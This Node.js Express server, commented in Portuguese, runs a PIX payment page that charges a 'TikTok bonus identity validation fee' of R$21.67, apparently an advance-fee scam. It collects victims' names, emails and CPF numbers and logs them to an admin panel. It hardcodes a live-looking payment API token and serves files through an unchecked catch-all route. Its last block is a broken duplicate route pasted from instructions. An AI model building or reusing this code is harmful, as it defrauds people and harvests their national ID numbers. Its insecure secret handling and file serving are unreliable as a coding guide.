const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚠️ CONFIGURAÇÃO REAL DA PLUMIFY (SUAS CHAVES)
const PLUMIFY_CONFIG = {
    token: '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa',
    accountId: '9kajnnbn2c',
    baseURL: 'https://api.plumify.com.br/api/public/v1',
    productHash: 'flnqw8vjsf'
};

// MIDDLEWARES ESSENCIAIS
app.use(express.json());
app.use(express.static(__dirname));

// CORS PARA PRODUÇÃO
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// HEALTH CHECK (OBRIGATÓRIO PARA RENDER)
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        service: 'TikTok PIX API',
        environment: process.env.NODE_ENV || 'production',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

// ROTA PRINCIPAL - REDIRECIONA PARA PAGAMENTO
app.get('/', (req, res) => {
    res.redirect('/pagamento');
});

// ROTA DO PAGAMENTO - PÁGINA PRINCIPAL
app.get('/pagamento', (req, res) => {
    res.sendFile(__dirname + '/pagamento.html');
});

// TESTE DA API
app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'API TikTok PIX funcionando!',
        server: 'Render',
        url: 'https://pagamento-cgzk.onrender.com',
        plumify: 'Conectado',
        timestamp: new Date().toISOString()
    });
});

// ⭐⭐ ROTA REAL PARA CRIAR PIX (PRODUÇÃO) ⭐⭐
app.post('/api/pix/create', async (req, res) => {
    console.log('=== INICIANDO CRIAÇÃO DE PIX ===');
    
    try {
        // VALIDAÇÃO DOS DADOS
        const { customerName, customerEmail, customerCpf } = req.body;
        
        if (!customerName || !customerEmail || !customerCpf) {
            console.log('❌ Dados incompletos:', req.body);
            return res.status(400).json({
                success: false,
                error: 'Dados incompletos. Preencha: nome, email e CPF.',
                required: ['customerName', 'customerEmail', 'customerCpf']
            });
        }
        
        // LIMPA CPF
        const cpfClean = customerCpf.replace(/\D/g, '');
        console.log('✅ Dados recebidos:', { customerName, customerEmail, cpfClean });
        
        // PAYLOAD PARA PLUMIFY (REAL)
        const payload = {
            api_token: PLUMIFY_CONFIG.token,
            amount: 2167, // R$ 21,67 em centavos
            payment_method: "pix",
            customer: {
                name: customerName.trim(),
                email: customerEmail.trim(),
                phone_number: "61995512071",
                document: cpfClean,
                zip_code: "00000000",
                street_name: "Rua",
                number: "0000",
                complement: "",
                neighborhood: "Bairro",
                city: "Cidade",
                state: "SP",
                country: "br"
            },
            cart: [
                {
                    product_hash: PLUMIFY_CONFIG.productHash,
                    title: "Taxa de Validação de Identidade - TikTok Bônus",
                    price: 2167,
                    quantity: 1,
                    tangible: false,
                    requires_shipping: false,
                    operation_type: 1
                }
            ],
            offer_hash: `tiktok_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            expire_in_days: 1,
            transaction_origin: "web"
        };
        
        console.log('📤 Enviando para Plumify...');
        
        // CHAMADA REAL PARA API PLUMIFY
        const response = await axios.post(
            `${PLUMIFY_CONFIG.baseURL}/transactions`,
            payload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout: 30000
            }
        );
        
        console.log('✅ Resposta Plumify - Status:', response.status);
        
        // PROCESSAMENTO DA RESPOSTA
        const data = response.data;
        
        // VERIFICA SE TEM ERRO NA RESPOSTA
        if (data.error) {
            console.log('❌ Erro na resposta Plumify:', data.error);
            return res.status(400).json({
                success: false,
                error: data.error.message || 'Erro na geração do PIX',
                details: data.error
            });
        }
        
        // FORMATA RESPOSTA PARA FRONTEND
        const result = {
            success: true,
            message: 'PIX gerado com sucesso!',
            transaction: {
                id: data.id || data.hash || `pix_${Date.now()}`,
                status: data.payment_status || 'waiting_payment',
                amount: 21.67,
                amount_cents: 2167,
                pix_code: data.pix?.pix_qr_code || data.qr_code || data.pix_qr_code || '',
                pix_url: data.pix?.pix_url || data.qr_code_image || data.pix_url || '',
                expiration: data.expires_at || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
                created_at: data.created_at || new Date().toISOString()
            }
        };
        
        // SE NÃO TEM URL DO QR CODE, GERA UMA
        if (result.transaction.pix_code && !result.transaction.pix_url) {
            result.transaction.pix_url = 
                `https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=${encodeURIComponent(result.transaction.pix_code)}`;
        }
        
        console.log('🎯 PIX gerado com sucesso!');
        
        res.json(result);
        
    } catch (error) {
        console.error('❌ ERRO CRÍTICO NO PIX:');
        console.error('Mensagem:', error.message);
        
        // RESPOSTA DE ERRO DETALHADA
        let errorMessage = 'Erro ao gerar PIX';
        
        if (error.response) {
            errorMessage = error.response.data?.message || error.response.data?.error || `Erro ${error.response.status}`;
        } else if (error.request) {
            errorMessage = 'Sem resposta do servidor de pagamento. Verifique sua conexão.';
        } else {
            errorMessage = error.message;
        }
        
        res.status(error.response?.status || 500).json({
            success: false,
            error: errorMessage,
            suggestion: 'Tente novamente em alguns instantes.'
        });
    }
});

// ROTA PARA VERIFICAR STATUS DO PIX
app.get('/api/pix/status/:id', async (req, res) => {
    try {
        const response = await axios.get(
            `${PLUMIFY_CONFIG.baseURL}/transactions/${req.params.id}`,
            {
                headers: {
                    'Authorization': `Bearer ${PLUMIFY_CONFIG.token}`,
                    'Accept': 'application/json'
                }
            }
        );
        
        res.json({
            success: true,
            transaction: response.data
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'Erro ao verificar status'
        });
    }
});

// ROTA PARA WEBHOOK
app.post('/webhook/plumify', (req, res) => {
    console.log('📩 Webhook recebido:', req.body);
    res.json({ received: true });
});

// ROTA PARA TODAS AS OUTRAS REQUESTS - SERVIR ARQUIVOS ESTÁTICOS
app.get('*', (req, res) => {
    // Tenta servir arquivos estáticos primeiro
    res.sendFile(__dirname + req.path, (err) => {
        if (err) {
            // Se arquivo não encontrado, redireciona para página principal
            res.redirect('/pagamento');
        }
    });
});

// INICIAR SERVIDOR
app.listen(PORT, () => {
    console.log(`
    🚀 TIKTOK PIX API - PRODUÇÃO
    =================================
    ✅ Servidor iniciado na porta: ${PORT}
    🌐 URL: https://pagamento-cgzk.onrender.com
    💰 Página principal: /pagamento
    📊 Health: /health
    💰 API PIX: /api/pix/create
    🕐 ${new Date().toISOString()}
    =================================
    `);
});
// ==================== ADMIN SYSTEM (APENAS ADICIONE ISSO NO FINAL) ====================

// Importar o sistema admin separado
const adminSystem = require('./admin-system');

// Rota para o painel admin (NOME DIFERENTE!)
app.get('/painel-admin.html', (req, res) => {
    res.sendFile(__dirname + '/painel-admin.html');
});

// Rota para login do admin (NOME DIFERENTE!)
app.get('/entrar-admin.html', (req, res) => {
    res.sendFile(__dirname + '/entrar-admin.html');
});

// API Login do Admin
app.post('/api/admin-system/login', (req, res) => {
    const { username, password } = req.body;
    
    console.log('🔐 Login admin tentado:', username);
    
    if (adminSystem.validateLogin(username, password)) {
        res.json({
            success: true,
            message: 'Login realizado!',
            token: adminSystem.ADMIN_CONFIG.secret,
            user: {
                username: username,
                role: 'admin'
            }
        });
    } else {
        res.status(401).json({
            success: false,
            error: 'Credenciais inválidas'
        });
    }
});

// API Dashboard do Admin
app.get('/api/admin-system/dashboard', (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (!adminSystem.validateToken(token)) {
        return res.status(401).json({ error: 'Não autorizado' });
    }
    
    const stats = adminSystem.getStats();
    const recentPayments = adminSystem.getRecentPayments(10);
    
    res.json({
        success: true,
        data: {
            stats: stats,
            recentPayments: recentPayments,
            serverInfo: {
                url: 'https://pagamento-cgzk.onrender.com',
                status: 'online',
                timestamp: new Date().toISOString()
            }
        }
    });
});

// API para listar pagamentos
app.get('/api/admin-system/payments', (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (!adminSystem.validateToken(token)) {
        return res.status(401).json({ error: 'Não autorizado' });
    }
    
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const status = req.query.status || 'all';
    
    // Simulação de paginação
    const db = adminSystem.getDatabase();
    let payments = db.payments;
    
    if (status !== 'all') {
        payments = payments.filter(p => p.status === status);
    }
    
    payments = payments.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    
    const start = (page - 1) * limit;
    const paginated = payments.slice(start, start + limit);
    
    res.json({
        success: true,
        payments: paginated,
        pagination: {
            page: page,
            limit: limit,
            total: payments.length,
            pages: Math.ceil(payments.length / limit)
        }
    });
});

// NO FINAL da rota /api/pix/create, ANTES do res.json(), adicione:
app.post('/api/pix/create', async (req, res) => {
    // ... seu código atual ...
    
    // DEPOIS de gerar o PIX na Plumify, ANTES de responder:
    
    // Capturar dados para o admin
    const paymentData = {
        id: result.transaction.id || `PIX_${Date.now()}`,
        customerName: customerName.trim(),
        customerEmail: customerEmail.trim(),
        customerCpf: cpfClean,
        amount: 21.67,
        status: 'pending',
        createdAt: new Date().toISOString(),
        pixCode: result.transaction.pix_code || '',
        pixUrl: result.transaction.pix_url || ''
    };
    
    // Registrar no sistema admin (não bloqueia a resposta)
    setTimeout(() => {
        adminSystem.addPayment(paymentData);
    }, 100);
    
    // ... continue com res.json(result) ...
});